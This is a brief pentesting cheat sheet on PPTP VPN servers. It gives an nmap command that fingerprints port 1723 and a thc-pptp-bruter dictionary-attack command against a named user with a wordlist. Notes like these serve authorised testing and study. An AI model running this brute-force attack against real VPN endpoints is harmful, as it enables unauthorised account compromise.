# PPTP

[Wikipedia - PPTP](https://en.wikipedia.org/wiki/Point-to-Point_Tunneling_Protocol) *"The Point-to-Point Tunneling Protocol (PPTP) is an obsolete method for implementing [virtual private networks](https://en.wikipedia.org/wiki/Virtual_private_network "Virtual private network"). PPTP has many well known security issues."*

## PPTP Hacking 

Identifying PPTP, it listens on TCP: 1723; [Kali Tools - thc-pptp-bruter](https://www.kali.org/tools/thc-pptp-bruter/)
```bash
# NMAP PPTP Fingerprint:
# Original: nmap â€“Pn -sV -p 1723 TARGET(S) 
# nmap -sV runs `pptp-version`
nmap -Pn -sV -p 1723 $submask/$mask  

# PPTP Dictionary Attack
thc-pptp-bruter -u hansolo -W -w /usr/share/wordlists/nmap.lst
```
## References

[Wikipedia - PPTP](https://en.wikipedia.org/wiki/Point-to-Point_Tunneling_Protocol)
[nmap scripts: pptp-version](https://nmap.org/nsedoc/scripts/pptp-version.html)
[Kali Tools - thc-pptp-bruter](https://www.kali.org/tools/thc-pptp-bruter/)